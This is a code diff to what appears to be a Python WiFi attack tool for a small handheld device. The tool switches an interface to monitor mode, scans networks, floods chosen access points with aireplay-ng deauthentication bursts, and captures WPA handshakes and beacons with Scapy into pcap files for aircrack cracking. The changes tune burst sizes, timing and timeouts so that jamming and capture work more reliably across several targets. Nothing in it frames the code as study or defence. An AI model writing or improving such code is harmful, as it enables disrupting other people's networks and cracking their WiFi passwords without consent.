@@ -182,18 +182,14 @@ def run_command(cmd, timeout=None):
 # ---------------------------------------------------------------------------
 
 def check_interface_exists(iface):
-    """Return True if the WiFi interface exists, trying alternatives."""
-    result = run_command(f"iwconfig {iface}")
-    if "No such device" not in result and "IEEE 802.11" in result:
+    """Return True if the WiFi interface exists."""
+    result = run_command(f"iw dev {iface} info")
+    if "Interface" in result:
         return True
-    # Try alternatives
-    patterns = ["wlan0", "wlan1", "wlan2", "wlan0mon", "wlan1mon", "wlan2mon"]
-    for alt in patterns:
-        if alt == WEBUI_INTERFACE or alt == f"{WEBUI_INTERFACE}mon":
-            continue
-        r = run_command(f"iwconfig {alt}")
-        if "No such device" not in r and "IEEE 802.11" in r:
-            return True
+    # Fallback to ip link
+    result = run_command(f"ip link show {iface} 2>/dev/null")
+    if iface in result and "does not exist" not in result:
+        return True
     return False
 
 
@@ -213,8 +209,8 @@ def setup_monitor_mode(iface):
     time.sleep(1)
 
     # Already in monitor?
-    iwc = run_command(f"iwconfig {iface}")
-    if "Mode:Monitor" in iwc:
+    iw_info = run_command(f"iw dev {iface} info")
+    if "type monitor" in iw_info:
         log(f"{iface} already in monitor mode")
         return True, iface
 
@@ -222,22 +218,22 @@ def setup_monitor_mode(iface):
     log("Trying airmon-ng")
     run_command(f"airmon-ng start {iface}")
     for candidate in [f"{iface}mon", iface]:
-        chk = run_command(f"iwconfig {candidate}")
-        if "Mode:Monitor" in chk:
+        chk = run_command(f"iw dev {candidate} info")
+        if "type monitor" in chk:
             log(f"Monitor mode on {candidate} via airmon-ng")
             return True, candidate
 
-    # Method 2: manual iwconfig
-    log("Trying manual iwconfig")
-    run_command(f"ifconfig {iface} down")
+    # Method 2: manual iw
+    log("Trying manual iw")
+    run_command(f"ip link set {iface} down")
     time.sleep(0.5)
-    run_command(f"iwconfig {iface} mode monitor")
+    run_command(f"iw dev {iface} set type monitor")
     time.sleep(0.5)
-    run_command(f"ifconfig {iface} up")
+    run_command(f"ip link set {iface} up")
     time.sleep(1)
-    chk = run_command(f"iwconfig {iface}")
-    if "Mode:Monitor" in chk:
-        log(f"Monitor mode on {iface} via iwconfig")
+    chk = run_command(f"iw dev {iface} info")
+    if "type monitor" in chk:
+        log(f"Monitor mode on {iface} via iw")
         return True, iface
 
     log("Failed to enable monitor mode")
@@ -329,11 +325,15 @@ def scan_networks(iface, timeout_sec):
 
         if bssid_i < 0 or essid_i < 0:
             continue
-        if len(cols) <= max(bssid_i, essid_i):
+        if len(cols) <= essid_i:
             continue
 
         bssid = cols[bssid_i].strip()
-        essid = cols[essid_i].strip().strip('"')
+        # ESSID is last column and may contain commas — rejoin everything from essid_i
+        essid = ",".join(cols[essid_i:]).strip().strip('"')
+        # Remove trailing "Key" column if present
+        if essid.endswith(","):
+            essid = essid[:-1].strip()
         channel = cols[ch_i].strip() if ch_i >= 0 and ch_i < len(cols) else "?"
         power_raw = cols[pwr_i].strip() if pwr_i >= 0 and pwr_i < len(cols) else "-99"
 
@@ -397,6 +397,12 @@ def start_attack_worker(targets, iface, stop_event, stats):
     """
     log(f"Attack worker started, {len(targets)} targets")
 
+    # Adaptive timing: more targets = less time per target
+    n = len(targets)
+    burst_pkts = 16 if n > 3 else 32 if n > 1 else 64
+    burst_count = max(1, 3 // n) if n > 0 else 3
+    cycle_pause = max(0.5, 2 - n * 0.5)
+
     while not stop_event.is_set():
         for target in targets:
             if stop_event.is_set():
@@ -405,41 +411,33 @@ def start_attack_worker(targets, iface, stop_event, stats):
             if ch == "?" or not ch.strip().isdigit():
                 continue
 
-            # Set channel
-            run_command(f"iwconfig {iface} channel {ch}")
-            time.sleep(0.5)
-            if stop_event.is_set():
-                break
-
             bssid = target["bssid"]
 
-            # Attack 1: 10s continuous broadcast deauth
-            if not stop_event.is_set():
-                cmd = f"timeout 10 aireplay-ng -0 0 -a {bssid} -c FF:FF:FF:FF:FF:FF {iface}"
-                result = run_command(cmd)
-                if "Sending" in result and "DeAuth" in result:
-                    stats["packets"] += 200
-                else:
-                    stats["packets"] += 100
+            # Set channel (with timeout to avoid hang)
+            run_command(f"iw dev {iface} set channel {ch}", timeout=3)
+            time.sleep(0.2)
+            if stop_event.is_set():
+                break
 
-            # Attack 2-4: three 64-packet bursts
-            for burst in range(3):
+            # Quick burst deauth per target (strict timeout to avoid blocking)
+            for burst in range(burst_count):
                 if stop_event.is_set():
                     break
-                cmd = f"aireplay-ng -0 64 -a {bssid} -c FF:FF:FF:FF:FF:FF {iface}"
-                run_command(cmd)
-                stats["packets"] += 64
-                time.sleep(0.3)
+                cmd = f"timeout 5 aireplay-ng -0 {burst_pkts} -a {bssid} {iface}"
+                result = run_command(cmd, timeout=8)
+                if "Error" not in result:
+                    stats["packets"] += burst_pkts
+                time.sleep(0.1)
 
             if stop_event.is_set():
                 break
 
-            # Brief pause between targets
-            if stop_event.wait(1):
+            # Minimal pause between targets
+            if stop_event.wait(0.3):
                 break
 
-        # Pause between cycles
-        if stop_event.wait(3):
+        # Brief pause between full cycles
+        if stop_event.wait(cycle_pause):
             break
 
     log("Attack worker stopped")
@@ -455,16 +453,27 @@ def start_capture_worker(targets, iface, stop_event, stats):
         log("Scapy not available -- capture worker disabled")
         return
 
-    eapol_msgs = {}  # (mac_a, mac_b) -> [pkt, ...]
+    eapol_msgs = {}   # (mac_a, mac_b) -> [pkt, ...]
+    beacons = {}      # bssid -> beacon pkt (one per AP)
+    target_bssids = {t["bssid"].upper() for t in targets}
 
     def _handle(pkt):
         if stop_event.is_set():
             return
+        if not pkt.haslayer(Dot11):
+            return
+
+        # Capture beacon frames from target APs (needed by aircrack for ESSID)
+        if pkt.type == 0 and pkt.subtype == 8:  # Beacon
+            bssid = (pkt[Dot11].addr3 or "").upper()
+            if bssid in target_bssids and bssid not in beacons:
+                beacons[bssid] = pkt
+
         if not pkt.haslayer(EAPOL):
             return
         stats["eapol"] += 1
-        src = (pkt[Dot11].addr2 or "").upper() if pkt.haslayer(Dot11) else ""
-        dst = (pkt[Dot11].addr1 or "").upper() if pkt.haslayer(Dot11) else ""
+        src = (pkt[Dot11].addr2 or "").upper()
+        dst = (pkt[Dot11].addr1 or "").upper()
         pair = tuple(sorted([src, dst]))
         if pair not in eapol_msgs:
             eapol_msgs[pair] = []
@@ -474,13 +483,20 @@ def start_capture_worker(targets, iface, stop_event, stats):
         if len(eapol_msgs[pair]) >= 4 and not stats.get("_saved_" + str(pair)):
             stats["_saved_" + str(pair)] = True
             stats["hs_captured"] += 1
+            essid = "unknown"
             # Determine SSID from targets
             for t in targets:
                 if t["bssid"].upper() in pair:
-                    stats["hs_ssid"] = t["essid"]
+                    essid = t["essid"]
                     break
-            # Save pcap
-            _save_handshake(eapol_msgs[pair], stats.get("hs_ssid", "unknown"))
+            stats["hs_ssid"] = essid
+            # Include beacon in saved pcap so aircrack can read the ESSID
+            save_pkts = []
+            for bssid in pair:
+                if bssid in beacons:
+                    save_pkts.append(beacons[bssid])
+            save_pkts.extend(eapol_msgs[pair])
+            _save_handshake(save_pkts, essid)
 
     def _sniff_loop():
         while not stop_event.is_set():
@@ -676,12 +692,8 @@ def draw_select(nets, idx, targets, mode):
         if net["clients"] > 0:
             draw.text((120, y), str(net["clients"]), font=FNT_XS, fill=CLR_YELLOW)
 
-    # Info bar above footer
-    draw.line((0, 108, 128, 108), fill=CLR_GRAY)
-    draw.text((2, 109), f"{len(targets)} sel  {MODE_LABELS[mode]}", font=FNT_XS, fill=CLR_YELLOW)
-    draw.text((80, 109), f"{idx + 1}/{len(nets)}", font=FNT_XS, fill=CLR_GRAY)
-
-    _footer("OK:Sel UP/DN K1:Scan K2:Go K3:Bk")
+    # Footer with selection info
+    _footer(f"{len(targets)}sel {MODE_LABELS[mode]}  K1:Scan K2:Go")
     _refresh()
 
 # ---------------------------------------------------------------------------
